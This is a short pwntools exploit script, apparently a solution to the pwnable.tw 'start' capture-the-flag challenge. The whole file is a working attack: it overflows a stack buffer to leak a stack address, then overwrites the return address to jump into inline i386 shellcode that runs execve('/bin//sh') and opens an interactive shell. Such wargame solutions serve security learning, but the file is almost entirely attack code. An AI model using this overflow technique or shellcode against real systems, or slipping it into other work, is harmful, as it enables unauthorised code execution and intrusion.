from pwn import *
p = process("./start")
#p = remote("chall.pwnable.tw",10000)
context.log_level = "debug"
context.arch = "i386"
context.terminal = ["tmux",'splitw',"-h"]

leak = 0x8048087
p1 = "A"*20+p32(leak)
#gdb.attach(p)
p.sendafter(":",p1)
addr = u32(p.recv(4))

print hex(addr)

shell2 = asm("""
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        push 11
        pop eax
        int 0x80
""")

p2 = "B"*20+p32(addr+0x14)+shell2
p.sendline(p2)
p.interactive()

